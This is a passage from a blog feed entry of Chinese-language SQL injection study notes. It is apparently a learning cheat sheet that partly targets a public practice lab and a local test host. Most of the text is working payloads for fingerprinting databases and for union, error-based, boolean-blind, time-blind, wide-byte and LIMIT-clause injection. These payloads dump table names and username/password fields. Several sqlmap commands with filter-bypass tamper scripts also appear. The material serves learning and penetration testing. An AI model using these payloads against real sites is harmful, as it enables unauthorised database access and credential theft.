      <category term="常见漏洞" scheme="http://archimesan.me/tags/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入学习</title>
    <link href="http://archimesan.me/2017/12/16/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
    <id>http://archimesan.me/2017/12/16/SQL注入学习/</id>
    <published>2017-12-16T07:20:18.000Z</published>
    <updated>2019-03-22T07:03:56.822Z</updated>
    
    <content type="html"><![CDATA[<p>SQL注入一些归纳</p><a id="more"></a><h1 id="数据库判断"><a href="#数据库判断" class="headerlink" title="数据库判断"></a>数据库判断</h1><h2 id="ACCESS"><a href="#ACCESS" class="headerlink" title="ACCESS"></a>ACCESS</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and (select count (*) from sysobjects)&gt;0 返回异常</span><br><span class="line">and (select count (*) from msysobjects)&gt;0 返回异常</span><br><span class="line">and  asc(chr(97))=97   是否access数据库</span><br></pre></td></tr></table></figure><p>判断方法：在网址最后输入（’；），返回不正常的时候，说明是 access 类型的。反之，则是 mssql 类型的。</p><h2 id="SQLSERVER"><a href="#SQLSERVER" class="headerlink" title="SQLSERVER"></a>SQLSERVER</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">and (select count (*) from sysobjects)&gt;0  返回正常</span><br><span class="line">and (select count (*) from msysobjects)&gt;0 返回异常</span><br><span class="line">and left(version(),1)=5%23 //红色字体也可能是4</span><br><span class="line">and exists(select id from sysobjects)</span><br></pre></td></tr></table></figure><h2 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=2 and version()&gt;0 返回正常</span><br><span class="line">id=2 and length(user())&gt;0 返回正常</span><br><span class="line">id=2 and char(49) 返回正常</span><br></pre></td></tr></table></figure><h2 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and length (select user from dual)&gt;0 返回正常</span><br></pre></td></tr></table></figure><h1 id="数据类型判断"><a href="#数据类型判断" class="headerlink" title="数据类型判断"></a>数据类型判断</h1><h2 id="整型"><a href="#整型" class="headerlink" title="整型"></a>整型</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">'           --对应查询语句 select * form users WHERE id=1'</span> LIMIT 0,1</span><br><span class="line">1 and 1=1</span><br><span class="line">1 and 1=2</span><br></pre></td></tr></table></figure><h2 id="字符串型"><a href="#字符串型" class="headerlink" title="字符串型"></a>字符串型</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">'           --对应查询语句 select * form users WHERE id='</span>1<span class="string">''</span> LIMIT 0,1  </span><br><span class="line">1<span class="string">' and '</span>1<span class="string">'='</span>1   </span><br><span class="line">1<span class="string">' and '</span>1<span class="string">'='</span>2</span><br></pre></td></tr></table></figure><h2 id="搜索型"><a href="#搜索型" class="headerlink" title="搜索型"></a>搜索型</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">'           --对应查询语句 select * form users WHERE id='</span>%1<span class="string">'%'</span> LIMIT 0,1</span><br><span class="line">1%<span class="string">' and '</span>%<span class="string">'='</span></span><br><span class="line">1%<span class="string">' and '</span>%<span class="string">'='</span>123</span><br></pre></td></tr></table></figure><h1 id="数据库类型及其注释符"><a href="#数据库类型及其注释符" class="headerlink" title="数据库类型及其注释符"></a>数据库类型及其注释符</h1><p><img src="1.jpeg" alt></p><h1 id="Sql注入常用的工具"><a href="#Sql注入常用的工具" class="headerlink" title="Sql注入常用的工具"></a>Sql注入常用的工具</h1><p>1）啊D ，适用 Access/Mssql<br>2）Pangolin<br>3）Sqlmap<br>4）AWVS<br>5）AppScan</p><p>一般较为常用的是1）2）3）</p><h1 id="sqlmap的使用方法"><a href="#sqlmap的使用方法" class="headerlink" title="sqlmap的使用方法"></a>sqlmap的使用方法</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Sqlmap –u <span class="string">"url"</span> --dbs        查询所有数据库</span><br><span class="line">Sqlmap –u <span class="string">"url"</span> --current-db  查看当前数据库</span><br><span class="line">Sqlmap –u <span class="string">"url"</span> --users       查看所有用户</span><br><span class="line">Sqlmap –u <span class="string">"url"</span> --current-user  查看当前用户</span><br><span class="line">Sqlmap –u <span class="string">"url"</span> –D 数据库  --tables 查看数据库里面的所有表</span><br><span class="line">Sqlmap –u <span class="string">"url"</span> –D 数据库 –T  表 --columns 查看表里面所有的列</span><br><span class="line">Sqlmap –u <span class="string">"url"</span> –D 数据库 –T  表 –C 列1,列2  --dump  查看所有数据</span><br><span class="line">Sqlmap –r post.txt  --dbs  post型注入</span><br><span class="line">Sqlmap –u <span class="string">"url"</span> --data=<span class="string">"id=1"</span> -f --banner --dbs --users  post 转化成 get</span><br><span class="line">--flush-session 把之前的结果清空，否则会影响判断得结果</span><br><span class="line">--is-dba  查看是否有数据库管理员权限</span><br><span class="line">--tamper  <span class="string">"space2randomblank.py"</span> 绕过脚本</span><br><span class="line">-p 关键字 或者在关键字加*  表示要检测的注入点</span><br><span class="line">space2randomblank.py 空格替换成%09</span><br><span class="line">randomcase.py   大小写</span><br><span class="line">unmagicquotes.py  宽字节 %bf</span><br><span class="line">randomcomments.py 随机分割关键词</span><br><span class="line">versionedmorekeywords.py 注释绕过</span><br><span class="line">space2comment.py   空格替换为/**/</span><br><span class="line">sqlmap –u <span class="string">"xx"</span>  --tamper <span class="string">"space2comment.py"</span>  --level 3 --risk 3</span><br></pre></td></tr></table></figure><h1 id="mysql-手工注入"><a href="#mysql-手工注入" class="headerlink" title="mysql 手工注入"></a>mysql 手工注入</h1><h2 id="显错注入"><a href="#显错注入" class="headerlink" title="显错注入"></a>显错注入</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">判断类型</span><br><span class="line">And+1=1%23 或者 or+1=1%23</span><br><span class="line">判断列数</span><br><span class="line">?id=1<span class="string">'+order+by+2%23</span></span><br><span class="line"><span class="string">判断数据回显的位置</span></span><br><span class="line"><span class="string">?id=1'</span>+union+select+1,2%20%23</span><br><span class="line">获取数据库名</span><br><span class="line">?id=1<span class="string">'+union+select+1,database()%23</span></span><br><span class="line"><span class="string">获取数据库中的表名</span></span><br><span class="line"><span class="string">?id=1'</span>+union+select+1,table_name+from+information_schema.tables+<span class="built_in">where</span>+table_schema=0x64767761%23</span><br><span class="line">获取数据库中表的列名</span><br><span class="line">?id=1<span class="string">'+union+select+1,column_name+from+information_schema.columns+where+ table_name=0x7573657273%23</span></span><br><span class="line"><span class="string">获取数据库表中列字段的值</span></span><br><span class="line"><span class="string">?id=1'</span>union+select+1,group_concat(user,0x7E237E,password)+from+users%23</span><br></pre></td></tr></table></figure><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>常见的拼接方式： and、or、&amp;&amp;、||</p><h4 id="利用-exp-函数报错注入"><a href="#利用-exp-函数报错注入" class="headerlink" title="利用 exp() 函数报错注入"></a>利用 exp() 函数报错注入</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp(~(select * FROM(SELECT USER())a));</span><br></pre></td></tr></table></figure><p>报错查询语句：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id= 1<span class="string">' and exp(~(select * FROM(SELECT USER())a))--+</span></span><br></pre></td></tr></table></figure><h3 id="利用-extractvalue-函数报错注入"><a href="#利用-extractvalue-函数报错注入" class="headerlink" title="利用 extractvalue() 函数报错注入"></a>利用 extractvalue() 函数报错注入</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(1,concat(0x7e,(select user()),0x7e))</span><br></pre></td></tr></table></figure><h4 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">' and extractvalue(1,concat(0x7e,(select database()),0x7e))--+</span></span><br></pre></td></tr></table></figure><h4 id="获取数据库中的表名"><a href="#获取数据库中的表名" class="headerlink" title="获取数据库中的表名"></a>获取数据库中的表名</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='</span>security<span class="string">'),0x7e))--+</span></span><br></pre></td></tr></table></figure><h4 id="获取数据库中表的列名"><a href="#获取数据库中表的列名" class="headerlink" title="获取数据库中表的列名"></a>获取数据库中表的列名</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='</span>security<span class="string">' and table_name='</span>users<span class="string">' ),0x7e))--+</span></span><br></pre></td></tr></table></figure><h4 id="获取数据库表中列字段的值"><a href="#获取数据库表中列字段的值" class="headerlink" title="获取数据库表中列字段的值"></a>获取数据库表中列字段的值</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">' and extractvalue(1,concat(0x7e,(select concat(id,'</span>~<span class="string">',username,'</span>~<span class="string">',password) from security.users limit 2,1 ),0x7e))--+</span></span><br></pre></td></tr></table></figure><h3 id="利用-updatexml-函数报错注入-报错查询语句："><a href="#利用-updatexml-函数报错注入-报错查询语句：" class="headerlink" title="利用 updatexml 函数报错注入 报错查询语句："></a>利用 updatexml 函数报错注入 报错查询语句：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,(select user()),0x7e),1)</span><br></pre></td></tr></table></figure><h4 id="获取数据库名-1"><a href="#获取数据库名-1" class="headerlink" title="获取数据库名"></a>获取数据库名</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id= 1<span class="string">' and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+</span></span><br></pre></td></tr></table></figure><h4 id="获取数据库中的表名-1"><a href="#获取数据库中的表名-1" class="headerlink" title="获取数据库中的表名"></a>获取数据库中的表名</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id= 1<span class="string">' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='</span>security<span class="string">'),0x7e),1) --+</span></span><br></pre></td></tr></table></figure><h4 id="获取数据库中表的列名-1"><a href="#获取数据库中表的列名-1" class="headerlink" title="获取数据库中表的列名"></a>获取数据库中表的列名</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='</span>users<span class="string">' ),0x7e),1) --+</span></span><br></pre></td></tr></table></figure><h4 id="获取数据库表中列字段的值-1"><a href="#获取数据库表中列字段的值-1" class="headerlink" title="获取数据库表中列字段的值"></a>获取数据库表中列字段的值</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">' and updatexml(1,concat(0x7e,(select concat(id,0x7e,username,0x7e,password) from security.users limit 2,1 ),0x7e),1) --+</span></span><br></pre></td></tr></table></figure><h3 id="利用-floor-函数报错注入-报错查询语句："><a href="#利用-floor-函数报错注入-报错查询语句：" class="headerlink" title="利用 floor 函数报错注入 报错查询语句："></a>利用 floor 函数报错注入 报错查询语句：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">' union select 1,2,3%23</span></span><br></pre></td></tr></table></figure><h4 id="获取数据库名-2"><a href="#获取数据库名-2" class="headerlink" title="获取数据库名"></a>获取数据库名</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">' union select count(*),1, concat('</span>~<span class="string">',(select database()),'</span>~<span class="string">', floor(rand()*2)) as a from information_schema.tables group by a%23</span></span><br></pre></td></tr></table></figure><h4 id="获取数据库中的表名-2"><a href="#获取数据库中的表名-2" class="headerlink" title="获取数据库中的表名"></a>获取数据库中的表名</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">' union select count(*),1, concat('</span>~<span class="string">',(select table_name from information_schema.tables where table_schema='</span>security<span class="string">' limit 0,1),'</span>~<span class="string">', floor(rand()*2)) as a from information_schema.tables group by a%23</span></span><br></pre></td></tr></table></figure><h4 id="获取数据库中表的列名-2"><a href="#获取数据库中表的列名-2" class="headerlink" title="获取数据库中表的列名"></a>获取数据库中表的列名</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">' union select count(*),1, concat('</span>~<span class="string">',(select column_name from information_schema.columns where table_name='</span>users<span class="string">' limit 0,1),'</span>~<span class="string">', floor(rand()*2)) as a from information_schema.tables group by a%23</span></span><br><span class="line"><span class="string">获取数据库表中列字段的值</span></span><br><span class="line"><span class="string">?id=1'</span> union select count(*),1, concat(<span class="string">'~'</span>,(select concat(id,<span class="string">'~'</span>,username,<span class="string">'~'</span>,password) from security.users <span class="built_in">limit</span> 0,1),<span class="string">'~'</span>, floor(rand()*2)) as a from information_schema.tables group by a%23</span><br></pre></td></tr></table></figure><h2 id="布尔型盲注"><a href="#布尔型盲注" class="headerlink" title="布尔型盲注"></a>布尔型盲注</h2><p>应用程序仅仅返回 True（页面）和 False（页面）。<br>先判断数据库长度试试<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">' and length(database())=8%23</span></span><br></pre></td></tr></table></figure></p><p>left() 函数：得到字符串左部指定个数的字符  语法：left (string,n)  string 为要截取的字符串，n 为长度<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">' and left(database(),1)='</span>d<span class="string">'--+</span></span><br><span class="line"><span class="string">?id=1'</span> and left(database(),2)=<span class="string">'dv'</span>--+</span><br></pre></td></tr></table></figure></p><p>substr() 函数：截取指定长度的字符串。 语法： string substr(string, start, length) 第一个参数为要处理的字符串，start 为开始位置，length 为截取的长度</p><p>举例：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">' and substr(database(),1,1)='</span>d<span class="string">'--+ '</span></span><br><span class="line">?id=1<span class="string">' and substr(database(),2,1)='</span>v’--+</span><br></pre></td></tr></table></figure></p><p>ASCII() 函数<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">' and ascii(substr(database(),1,1))=100--+</span></span><br><span class="line"><span class="string">?id=1'</span> and ascii(substr(database(),2,1))=118--+</span><br></pre></td></tr></table></figure></p><p>ord() 函数：返回字符串第一个字符的 ASCII 值<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1‘ and ord(substr(database(),1,1))=100--+</span><br><span class="line">?id=1‘ and ord(substr(database(),1,1))=100--+</span><br></pre></td></tr></table></figure></p><p>mid() 函数：截取字符串指定长度的字符串<br>语法： MID(column_name,start[,length]) column_name 为要提取字符的字段，start 为开始截取位置(起始值是1)，length 为截取的长度(可选，默认余下所有字符)</p><p>举例：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">' and MID(DATABASE(),1,1)='</span>d<span class="string">' --+</span></span><br><span class="line"><span class="string">?id=1'</span> and MID(DATABASE(),2,1)=<span class="string">'v'</span> --+</span><br><span class="line">?id=1<span class="string">' and ord(MID(DATABASE(),1,1))=100 --+</span></span><br><span class="line"><span class="string">?id=1'</span> and ord(MID(DATABASE(),2,1))=118 --+</span><br></pre></td></tr></table></figure></p><p>regexp ：正则表达式 语法： regexp ^[a-z] 表示字符串中第一个字符是在 a-z范围内。 regexp ^a 表示字符串第一个字符是a。 regexp ^ab 表示字符串前两个字符是ab。</p><p>举例：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">' and database() regexp '</span>^d<span class="string">' --+</span></span><br><span class="line"><span class="string">?id=1'</span> and database() regexp <span class="string">'^dv'</span> --+</span><br></pre></td></tr></table></figure></p><p>like：与正则表达式类似 语法： Like ‘%a’表示字符串第一个字符是a。 Like ‘%ab’表示字符串前两个字符是ab。</p><p>举例：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">' and database() like '</span>d%<span class="string">' --+</span></span><br><span class="line"><span class="string">?id=1'</span> and database() like <span class="string">'dv%'</span> --+</span><br></pre></td></tr></table></figure></p><p>if()函数：判断函数，并根据判断结果返回特定值。<br>语法： if(判断条件,正确返回的值,错误返回的值)</p><p>举例：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>()函数可以和前面提到的函数结合使用</span><br><span class="line">?id=1<span class="string">' and 1=if(前面提到的注入语句,1,0) --+</span></span><br><span class="line"><span class="string">?id=1'</span> and 1=<span class="keyword">if</span>(left(database(),1)=<span class="string">'d'</span>,1,0) --+</span><br><span class="line">?id=1<span class="string">' and 1=if(substr(database(),1,1)='</span>d<span class="string">',1,0) --+</span></span><br><span class="line"><span class="string">?id=1'</span> and 1=<span class="keyword">if</span>(ascii(substr(database(),1,1))=100,1,0) --+</span><br><span class="line">?id=1<span class="string">' and 1=if(MID(DATABASE(),1,1)='</span>d<span class="string">',1,0) --+</span></span><br><span class="line"><span class="string">?id=1'</span> and 1=<span class="keyword">if</span>(ord(MID(DATABASE(),1,1))=100,1,0) --+</span><br><span class="line">?id=1<span class="string">' and 1=if(database() regexp '</span>^d<span class="string">',1,0) --+</span></span><br><span class="line"><span class="string">?id=1'</span> and 1=<span class="keyword">if</span>(database() like <span class="string">'d%'</span>,1,0) --+</span><br></pre></td></tr></table></figure></p><h2 id="基于时间型盲住"><a href="#基于时间型盲住" class="headerlink" title="基于时间型盲住"></a>基于时间型盲住</h2><p>时间型盲注与布尔型盲注的语句构造过程类似，通常在布尔型盲注表达式的基础上使用IF语句加入延时语句来构造<br>如果 web 页面的返回值只有一种，true，无论输入任何值，它的返回都会按正确的来处理<br>时间型盲注语句<br>判断数据库长度</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">uname=a&amp;passwd=a<span class="string">") or if(length(database())=7, sleep(5),0) #</span></span><br><span class="line"><span class="string">uname=a&amp;passwd=a"</span>) or <span class="keyword">if</span>(length(database())=8, sleep(5),0) <span class="comment">#</span></span><br><span class="line">?id=1<span class="string">' and if(left(database(),1)='</span>s<span class="string">',sleep(3),0)--+</span></span><br><span class="line"><span class="string">?id=1'</span> and 1=<span class="keyword">if</span>(left(database(),1)=<span class="string">'d'</span>,sleep(3),0) --+</span><br><span class="line">?id=1<span class="string">' and 1=if(substr(database(),1,1)='</span>d<span class="string">',sleep(3),0) --+</span></span><br><span class="line"><span class="string">?id=1'</span> and 1=<span class="keyword">if</span>(ascii(substr(database(),1,1))=100,sleep(3),0) --+</span><br><span class="line">?id=1<span class="string">' and 1=if(MID(DATABASE(),1,1)='</span>d<span class="string">',sleep(3),0) --+</span></span><br><span class="line"><span class="string">?id=1'</span> and 1=<span class="keyword">if</span>(ord(MID(DATABASE(),1,1))=100,sleep(3),0) --+</span><br><span class="line">?id=1<span class="string">' and 1=if(database() regexp '</span>^d<span class="string">',sleep(3),0) --+</span></span><br><span class="line"><span class="string">?id=1'</span> and 1=<span class="keyword">if</span>(database() like <span class="string">'d%'</span>,sleep(3),0) --+</span><br></pre></td></tr></table></figure><p>已知 flag 表求 flag 字段<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">' and (select case when (select length(flag) from flag limit 1)=32 then sleep(5) else 1 end) and '</span>1<span class="string">'='</span>1</span><br><span class="line">?id=1<span class="string">' and (select case when (select ord(substring(flag from 1 for 1)) from flag limit 1) = 2 then sleep(5) else 1 end) and '</span>1<span class="string">'='</span>1</span><br><span class="line">?id=1<span class="string">' and exists(select flag from flag) and sleep(5) and '</span>1<span class="string">' = '</span>1</span><br></pre></td></tr></table></figure></p><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>text/html; charset=gb2312 简体中文 判断是宽字节注入</p><h3 id="获取数据库名-3"><a href="#获取数据库名-3" class="headerlink" title="获取数据库名"></a>获取数据库名</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=2%bf<span class="string">' union select 1,2,database()%23</span></span><br></pre></td></tr></table></figure><h3 id="获取数据库中的表名-3"><a href="#获取数据库中的表名-3" class="headerlink" title="获取数据库中的表名"></a>获取数据库中的表名</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=2%bf<span class="string">' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) %23</span></span><br></pre></td></tr></table></figure><h3 id="获取数据库中表的列"><a href="#获取数据库中表的列" class="headerlink" title="获取数据库中表的列"></a>获取数据库中表的列</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=1%df%27 union select 1,group_concat(column_name),3 from information_schema.columns <span class="built_in">where</span> table_name=0x7361655F757365725F73716C6934%23</span><br></pre></td></tr></table></figure><h3 id="获取数据库表中列字段的值-2"><a href="#获取数据库表中列字段的值-2" class="headerlink" title="获取数据库表中列字段的值"></a>获取数据库表中列字段的值</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=1%df%27 union select 1,group_concat(id,0x7e,title_1,0x7e,content_1),3 from mydbs.sae_user_sqli4 %23</span><br></pre></td></tr></table></figure><h2 id="limit注入"><a href="#limit注入" class="headerlink" title="limit注入"></a>limit注入</h2><p>发现回显会多一个”,1”，并且”1”由 num 参数控制。并且不加 num 参数不提供报错，由此想到 limit 注入。<br>limit 1,1 procedure analyse (extractvalue(rand(),concat(0x3a,SQL注入代码)),1)</p><p>语法：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</span><br></pre></td></tr></table></figure></p><h3 id="获取数据库表"><a href="#获取数据库表" class="headerlink" title="获取数据库表"></a>获取数据库表</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=0 procedure analyse (extractvalue(rand(),concat(0x3a,(select database()))),1)%23&amp;num=1</span><br></pre></td></tr></table></figure><h3 id="获取数据库表中的列"><a href="#获取数据库表中的列" class="headerlink" title="获取数据库表中的列"></a>获取数据库表中的列</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=0 procedure analyse (extractvalue(rand(),concat(0x3a,(select group_concat(table_name) from information_schema.tables <span class="built_in">where</span> table_schema=database()))),1)%23&amp;num=1</span><br></pre></td></tr></table></figure><h3 id="获取数据库表中列字段的值-3"><a href="#获取数据库表中列字段的值-3" class="headerlink" title="获取数据库表中列字段的值"></a>获取数据库表中列字段的值</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=0 procedure analyse (extractvalue(rand(),concat(0x3a,(select group_concat(column_name) from information_schema.columns <span class="built_in">where</span> table_name=0x75736572))),1)%23&amp;num=1</span><br><span class="line">或者http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=0 procedure analyse (extractvalue(rand(),concat(0x3a,(select concat(username,0x3a,password) from user <span class="built_in">limit</span> 2,1))),1)%23&amp;num=1</span><br></pre></td></tr></table></figure><h2 id="基于约束的-SQL-攻击"><a href="#基于约束的-SQL-攻击" class="headerlink" title="基于约束的 SQL 攻击"></a>基于约束的 SQL 攻击</h2><p>也就是二次注入的原理<br>因为 sql 的 select 是不忽视最大长度的限制的<br>而 insert 是有最大长度的限制的，超过长度限制就会发生截断。所以可以利用 insert 插入一个任意用户名加（N个空格，一般64个）然后用 select 选择出来，select 默认是选择第一条数据，所以存在一个任意用户登录的漏洞</p><h2 id="access手工注入"><a href="#access手工注入" class="headerlink" title="access手工注入"></a>access手工注入</h2><h3 id="判断是否注入点"><a href="#判断是否注入点" class="headerlink" title="判断是否注入点"></a>判断是否注入点</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入 http://192.168.1.7:800/shownews.asp?id=178 and 1=1 网页正常</span><br></pre></td></tr></table></figure><p><img src="7_1.jpeg" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入 http://192.168.1.7:800/shownews.asp?id=178 and 1=2 网页不正常</span><br></pre></td></tr></table></figure><p><img src="7_2.jpeg" alt></p><h3 id="猜解表-access-只能通过猜测获得表和字段"><a href="#猜解表-access-只能通过猜测获得表和字段" class="headerlink" title="猜解表  access 只能通过猜测获得表和字段"></a>猜解表  access 只能通过猜测获得表和字段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.7:800/shownews.asp?id=178 and exists (select * from admin)  页面正常</span><br></pre></td></tr></table></figure><p>说明存在 admin 这个表</p><p><img src="7_3.jpeg" alt></p><h3 id="猜解列"><a href="#猜解列" class="headerlink" title="猜解列"></a>猜解列</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span 